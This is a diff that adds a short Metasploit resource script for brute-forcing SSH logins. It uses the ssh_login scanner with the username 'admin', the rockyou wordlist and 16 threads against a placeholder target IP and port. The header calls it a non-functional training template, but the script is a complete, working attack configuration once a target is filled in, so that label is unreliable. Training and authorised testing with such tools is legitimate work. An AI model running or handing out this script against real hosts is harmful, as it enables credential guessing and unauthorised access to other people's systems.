@@ -1,0 +1,11 @@
+# SSH Brute Force Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS <TARGET_IP>
+set RPORT <SSH_PORT>
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set THREADS 16
+set VERBOSE true
+run
